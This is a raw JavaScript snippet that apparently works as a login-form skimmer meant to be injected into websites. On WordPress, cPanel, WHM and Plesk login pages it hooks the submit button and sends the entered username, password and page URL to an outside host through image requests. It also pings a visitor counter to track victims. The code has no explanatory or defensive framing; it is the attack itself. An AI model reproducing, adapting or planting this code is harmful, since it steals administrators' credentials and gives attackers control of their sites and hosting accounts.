if(window.location.href.indexOf("wp-login.php") > 0 || window.location.href.indexOf("wp-admin") > 0) {
new Image().src = '//whos.amung.us/widget/kekonam92.png';
document.getElementById('wp-submit').onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
};
}
if(document.title.toLowerCase().indexOf("cpanel") >= 0){
	new Image().src = '//whos.amung.us/widget/kekonam91.png';
	
document.getElementById('login_submit').onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp2.php?username='+document.getElementById('user').value+'&sifre='+document.getElementById('pass').value+'&location='+location.href;
};
}


if(document.title.toLowerCase().indexOf("whm") >= 0){
	
	new Image().src = '//whos.amung.us/widget/kekonam91.png';
document.getElementById('login_submit').onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp2.php?username='+document.getElementById('user').value+'&sifre='+document.getElementById('pass').value+'&location='+location.href;
};
}


if(document.title.toLowerCase().indexOf("plesk") >= 0){
	new Image().src = '//whos.amung.us/widget/kekonam91.png';
	
document.querySelectorAll("button").onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp2.php?username='+document.getElementById('loginSection-username').value+'&sifre='+document.getElementById('loginSection-password').value+'&location='+location.href;
};
}


